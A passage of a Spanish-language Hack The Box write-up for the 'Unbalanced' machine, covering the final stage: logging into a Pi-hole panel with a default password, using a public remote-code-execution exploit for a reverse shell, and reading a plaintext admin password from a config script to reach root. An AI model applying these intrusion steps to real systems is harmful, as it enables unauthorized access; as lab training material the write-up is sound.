Tenemos un archivo en el que se listan las tareas hechas y por hacer:

```bash
bryan@unbalanced:~$ cat TODO 
############
# Intranet #
############
* Install new intranet-host3 docker [DONE]
* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
* Test intranet-host3 [DONE]
* Add intranet-host3 to load balancer [DONE]
* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
* Fix intranet-host2 [DONE]
* Re-add intranet-host2 to load balancer (set default weight) [DONE]
- Fix intranet-host1 [TODO]
- Re-add intranet-host1 to load balancer (set default weight) [TODO]

###########
# Pi-hole #
###########
* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
* Set temporary admin password [DONE]
* Create Pi-hole configuration script [IN PROGRESS]
- Run Pi-hole configuration script [TODO]
- Expose Pi-hole ports to the network [TODO]
bryan@unbalanced:~$ 
```

La primera parte **Intranet** nos explica (o bueno bryan nos da un recorrido) del por que y que se hizo para "arreglar" toooda la primera fase que hicimos :)

La segunda es donde nos vamos a enfocar, nos indica que existe un contenedor que mantiene la imagen **pi-hole**.

> **Pi-hole** es un software de código abierto que proporciona bloqueo de anuncios (y más) para toda su red doméstica. Lo hace bloqueando dominios conocidos que publican anuncios e incluso tiene la capacidad de bloquear solicitudes de red a dominios maliciosos si el nombre de dominio está contenido en una de las listas de bloqueo. En resumen Pi-hole actúa como un hoyo negro de anuncios. [MoisesSerrano.com](https://www.moisesserrano.com/instalar-pi-hole-docker-debian/)

Validando comandos de **Docker** nos da un: **/docker.sock: connect: permission denied**. Veamos el servicio **docker** en el sistema:

```bash
bryan@unbalanced:~$ systemctl status docker
● docker.service - Docker Application Container Engine
   Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled)
   Active: active (running) since Fri 2020-11-20 00:10:23 EST; 11h ago
     Docs: https://docs.docker.com
 Main PID: 671
    Tasks: 40
   Memory: 156.1M
   CGroup: /system.slice/docker.service
           ├─ 671 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
           ├─1005 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.31.11.3 -container-port 80
           ├─1020 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 5553 -container-ip 172.31.11.3 -container-port 53
           └─1039 /usr/bin/docker-proxy -proto udp -host-ip 127.0.0.1 -host-port 5553 -container-ip 172.31.11.3 -container-port 53
bryan@unbalanced:~$ 
```

Está activo y además nos muestra que está corriendo "algo" sobre la dirección `172.31.11.3`, vamos a visitarla.

![268pagepiholeinit](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268pagepiholeinit.png)

Si entramos:

![268pagepiholeadminpanel](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268pagepiholeadminpanel.png)

1. Tenemos versiones: `Pi-hole Version v4.3.2 Web Interface Version v4.3 FTL Version v4.3.1`. (Hay vulnerabilidades pero debemos estar autenticados para poder usarlas)
2. Tenemos un login panel, echémosle un ojito.

![268pagepiholeloginpane](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268pagepiholeloginpane.png)

Si probamos con las contraseñas que encontramos mediante el XPath no nos funciona. Probando `admin` nos deja entrar :P

![268pagepiholeloginaccess](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268pagepiholeloginaccess.png)

En internet nos encontramos un exploit que se aprovecha de una vulnerabilidad en el apartado `/settings.php?tab=piholedhcp` mediante la cual podemos ejecutar comandos remotamente. Dicho exploit ya tiene por defecto que nos genere una reverse shell.

![268bashpiholeexploitaccess](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268bashpiholeexploitaccess.png)

Vemos los archivos que maneja el sitio, prácticamente estamos dentro del contenedor. Enumeremos a ver que.

Después de un rato, estuve confundido y también simplemente leyendo archivos. Volví al sitio web de **Pi-Hole** a la parte de `/settings.php` (que es la que explota el exploit) y vi algo:

![268pagepiholesettings_php](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268pagepiholesettings_php.png)

Estamos dentro del contenedor, por lo tanto podemos pasearnos por todo el <<contenedor>>, así que el acceso a la ruta `/root` (si miramos la imagen dice que somos **root** y estamos en el grupo **root**) no debe estar restringido (:

```bash
www-data@pihole:/$ cd /root
cd /root
www-data@pihole:/root$ ls
ls
ph_install.sh  pihole_config.sh
www-data@pihole:/root$ 
```

Si recordamos `/TODO` en la máquina de **bryan** hablaba de un archivo de configuración.

```bash
bryan@unbalanced:~$ cat TODO
...
* Set temporary admin password [DONE]
* Create Pi-hole configuration script [IN PROGRESS]
...
```

Veamos si se trata de `pihole_config.sh`:

```bash
www-data@pihole:/root$ cat pihole_config.sh
cat pihole_config.sh
#!/bin/bash

# Add domains to whitelist
/usr/local/bin/pihole -w unbalanced.htb
/usr/local/bin/pihole -w rebalanced.htb

# Set temperature unit to Celsius
/usr/local/bin/pihole -a -c

# Add local host record
/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1

# Set privacy level
/usr/local/bin/pihole -a -l 4

# Set web admin interface password
/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'

# Set admin email
/usr/local/bin/pihole -a email admin@unbalanced.htb
www-data@pihole:/root$ 
```

Perfecto, tenemos el archivo que configura todo lo relacionado a pi-hole (tal como lo indico bryan), además de tener una contraseña asignada al usuario administrador :O

![268bashtestpwroot](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268bashtestpwroot.png)

Listooooooooo, tamos dentro como usuario administrador del sistema, echémosle un ojo a los flags:

![268flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unbalanced/268flags.png)

...

Hemos terminado... Que linda máquina, me encanto, al inicio (como en SneakyMailer) me reeeeperdi, pero era parte de lo que podía pasar, además tomando en cuenta que es mi primer máquina en nivel Hard entonces era predecible que me iba a sentir atascado en varios lados.

La vulnerabilidad XPath me gusto mucho, además de probar y mejorar mi scripting [me parece que salió un bonito script](https://github.com/lanzt/blog/tree/main/assets/scripts/HTB/unbalanced/vulnpage.py)

Agradezco a [@TazWake](https://www.hackthebox.eu/profile/49335) de nuevo por la ayuda (aunque no va a leer esto pero no esta de más).

Esto es todo por este writeup, nos reencontraremos en otro viaje de conocimiento, lectura y estancamientos :P Gracias por pasarte por acá :)